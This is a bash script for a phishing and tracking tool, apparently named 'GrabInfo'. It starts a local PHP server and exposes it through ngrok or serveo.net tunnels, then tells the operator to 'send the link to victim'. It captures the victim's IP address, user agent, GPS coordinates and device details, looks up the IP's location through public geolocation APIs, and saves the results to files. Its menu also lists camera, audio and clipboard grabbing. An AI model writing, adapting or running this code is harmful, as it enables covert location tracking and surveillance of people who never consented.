#!/bin/bash

trap 'printf "\n";stop;exit 1' 2

deps() {

command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[1;96m Packages are not Installed ! type \e[0m\e[1;93mbash setup\e[0m\n\n"; exit 1; }
command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[1;96m Packages are not Installed ! type \e[0m\e[1;93mbash setup\e[0m\n\n"; exit 1; }
command -v ssh > /dev/null 2>&1 || { printf "\n\e[0m\e[1;96m Packages are not Installed ! type \e[0m\e[1;93mbash setup\e[0m\n\n"; exit 1; }
command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[1;96m Packages are not Installed ! type \e[0m\e[1;93mbash setup\e[0m\n\n"; exit 1; }

if [[ -e .server/ngrok ]]; then
echo ""
else
printf "\n\e[0m\e[1;96m Packages are not Installed ! type \e[0m\e[1;93mbash setup\e[0m\n\n"
exit 1
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e .grablink ]]; then
rm -rf .grablink
fi

}

banner() {

clear
printf "\e[0m\n"
printf "\e[0m\e[1;92m   _____           _      \e[0m\e[1;93m  _____        __       \e[0m\n"
printf "\e[0m\e[1;92m  / ____|         | |     \e[0m\e[1;93m |_   _|      / _|      \e[0m\n"
printf "\e[0m\e[1;92m | |  __ _ __ __ _| |__   \e[0m\e[1;93m   | |  _ __ | |_ ___   \e[0m\n"
printf "\e[0m\e[1;92m | | |_ |  __/ _  |  _ \  \e[0m\e[1;93m   | | |  _ \|  _/ _ \  \e[0m\n"
printf "\e[0m\e[1;92m | |__| | | | (_| | |_) | \e[0m\e[1;93m  _| |_| | | | || (_) | \e[0m\n"
printf "\e[0m\e[1;92m  \_____|_|  \__,_|_.__/  \e[0m\e[1;93m |_____|_| |_|_| \___/  \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[1;96m    [\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Created By HTR-TECH \e[0m\e[1;91m(\e[0m\e[1;93m Tahmid Rayat \e[0m\e[1;91m)\e[0m\n"

}

menu() {

printf "\e[0m\n"
printf "\e[0m\e[1;91m [\e[1;97m01\e[1;91m]\e[1;93m Grab Location\e[0m\n"
printf "\e[0m\e[1;91m [\e[1;97m02\e[1;91m]\e[1;93m Grab Cam File\e[0m\n"
printf "\e[0m\e[1;91m [\e[1;97m03\e[1;91m]\e[1;93m Grab Audio File\e[0m\n"
printf "\e[0m\e[1;91m [\e[1;97m04\e[1;91m]\e[1;93m Grab Clipboard\e[0m\n"
printf "\e[0m\e[1;91m [\e[1;97m00\e[1;91m]\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option

if [[ $option == 1 || $option == 01 ]]; then
glocation
elif [[ $option == 2 || $option == 02 ]]; then
gcamfile
elif [[ $option == 3 || $option == 03 ]]; then
gaudiofile
elif [[ $option == 4 || $option == 04 ]]; then
gclipboard
elif [[ $option == 0 || $option == 00 ]]; then
printf "\n\e[0m\e[1;93m     Thanks for using this tool !!\e[0m\n\n"
exit 1

else
printf " \n\n\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

glocation() {

printf "\e[0m\n"
printf "\e[0m\e[1;91m [\e[1;97m01\e[1;91m]\e[1;93m Ngrok\e[0m\n"
printf "\e[0m\e[1;91m [\e[1;97m02\e[1;91m]\e[1;93m Serveo\e[0m\n"
printf "\e[0m\n"
glocation_d_o_server="1"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' gloc_option_server
gloc_option_server="${gloc_option_server:-${glocation_d_o_server}}"

if [[ $gloc_option_server == 1 || $gloc_option_server == 01 ]]; then
startngrok_gloc
elif [[ $gloc_option_server == 2 || $gloc_option_server == 02 ]]; then
startserveo_gloc

else
printf " \n\n\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
startngrok_gloc() {

if [[ -e .server/location/ip.txt ]]; then
rm -rf .server/location/ip.txt

fi
if [[ -e .server/location/location.txt ]]; then
rm -rf .server/location/location.txt

fi
if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\n"
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok...\e[0m\n"
cd .server/location && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
cd .server && ./ngrok http 5555 > /dev/null 2>&1 &
sleep 5
glocngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $glocngroklink

glocfound

}

startserveo_gloc() {

if [[ -e .server/location/ip.txt ]]; then
rm -rf .server/location/ip.txt

fi
if [[ -e .server/location/location.txt ]]; then
rm -rf .server/location/location.txt

fi
if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi

glocdef_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $glocdef_port
read glocport
glocport="${glocport:-${glocdef_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mhttp://127.0.0.1:$glocport\e[0m\e[1;92m)\e[0m\n"
cd .server/location && php -S 127.0.0.1:$glocport > /dev/null 2>&1 & 
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
if [[ -e .grablink ]]; then
rm -rf .grablink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$glocport' serveo.net 2> /dev/null > .grablink ' &
printf "\n"
sleep 5
gloc_send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" .grablink)
printf "\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $gloc_send_url

glocfound

}

glocfound() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Victim ,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
while [ true ]; do


if [[ -e ".server/location/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
printf "\e[0m\n"
gloc_catch_ip

fi
sleep 1
done 

}
gloc_catch_ip() {

touch location.txt
glocip=$(grep -a 'IP:' .server/location/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
glocua=$(grep 'User-Agent:' .server/location/ip.txt | cut -d '"' -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP :\e[0m\e[1;96m %s\e[0m\n" $glocip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m User-Agent :\e[0m\e[1;96m %s\e[0m\n" $glocua
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m victim_ip.txt\e[0m\n"
cat .server/location/ip.txt >> victim_ip.txt

ipaddripapico=$(curl -s "https://ipapi.co/$useripaddress/json" -L)
ipaddripapicom=$(curl -s "http://ip-api.com/json/$useripaddress" -L)
usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userasn=$(echo $ipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')

printf "\e[0m\n"
printf " \e[1;31m[\e[1;37m::\e[1;31m]\e[1;33m IP Credentials \e[1;31m[\e[1;37m::\e[1;31m]\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  City          \e[0m\e[1;96m:\e[0m\e[1;92m   $usercity\e[0m\n"
printf "  \e[0m\e[1;93m  Region        \e[0m\e[1;96m:\e[0m\e[1;92m   $useregion\e[0m\n"
printf "  \e[0m\e[1;93m  Country       \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountry\e[0m\n"
printf "  \e[0m\e[1;93m  Time Zone     \e[0m\e[1;96m:\e[0m\e[1;92m    $usertime\e[0m\n"
printf "  \e[0m\e[1;93m  Postal Code   \e[0m\e[1;96m:\e[0m\e[1;92m    $userpostal\e[0m\n"
printf "  \e[0m\e[1;93m  Country Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Calling Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercalling\e[0m\n"
printf "  \e[0m\e[1;93m  ISP           \e[0m\e[1;96m:\e[0m\e[1;92m   $userisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN           \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[0m\n"
printf "\e[0m\n"

while [ true ]; do


if [[ -e ".server/location/location.txt" ]]; then
gloc_catch_cred

fi
sleep 0.5
if [[ -e ".server/location/error.txt" ]]; then
checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m User Denied Access !!\e[0m\n"
rm -rf server/error.txt

else
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m User Denied Access !!\e[0m\n"
exit 1
fi
fi

sleep 0.5

done

}

gloc_catch_cred() {

longitude=$(grep -o 'Longitude:.*' .server/location/location.txt | cut -d " " -f2 | tr -d ' ')
IFS=$'\n'
latitude=$(grep -o 'Latitude:.*' .server/location/location.txt | cut -d ":" -f2 | tr -d ' ')
accuracy=$(grep -o 'Accuracy:.*' .server/location/location.txt | cut -d ":" -f2 | tr -d ' ')
hardware=$(grep -o 'Cores:.*' .server/location/location.txt | cut -d ":" -f2 | tr -d ' ')
platform=$(grep -o 'Platform:.*' .server/location/location.txt | cut -d ":" -f2 | tr -d ' ')
memory=$(grep -o 'Memory:.*' .server/location/location.txt | cut -d ":" -f2 | tr -d ' ')
height=$(grep -o 'Screen Height:.*' .server/location/location.txt | cut -d ":" -f2 | tr -d ' ')
width=$(grep -o 'Screen Width:.*' .server/location/location.txt | cut -d ":" -f2 | tr -d ' ')
printf "\n"
printf " \e[1;31m[\e[1;37m::\e[1;31m]\e[1;33m Geolocation \e[1;31m[\e[1;37m::\e[1;31m]\e[0m\n"
printf "\n"
printf "  \e[0m\e[1;93m  Latitude     \e[0m\e[1;96m:\e[0m\e[1;92m   $latitude\e[0m\n"
printf "  \e[0m\e[1;93m  Longitude    \e[0m\e[1;96m:\e[0m\e[1;92m   $longitude\e[0m\n"
printf "  \e[0m\e[1;93m  Accuracy     \e[0m\e[1;96m:\e[0m\e[1;92m   $accuracy\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  GOOGLE Maps   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$latitude,$longitude\e[0m\n"
printf "\e[0m\n"
printf " \e[1;31m[\e[1;37m::\e[1;31m]\e[1;33m Device Info \e[1;31m[\e[1;37m::\e[1;31m]\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Platform     \e[0m\e[1;96m:\e[0m\e[1;92m   $platform\e[0m\n"
printf "  \e[0m\e[1;93m  Cores        \e[0m\e[1;96m:\e[0m\e[1;92m   $hardware\e[0m\n"
printf "  \e[0m\e[1;93m  Memory       \e[0m\e[1;96m:\e[0m\e[1;92m   $memory\e[0m\n"
printf "  \e[0m\e[1;93m  Resolution   \e[0m\e[1;96m:\e[0m\e[1;92m   %sx%s\n\e[0m" $height $width
cat .server/location/location.txt >> location.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Saved as :\e[0m\e[1;93m location.txt\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"

killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e .grablink ]]; then
rm -rf .grablink
fi
exit 1

}




banner
deps
menu
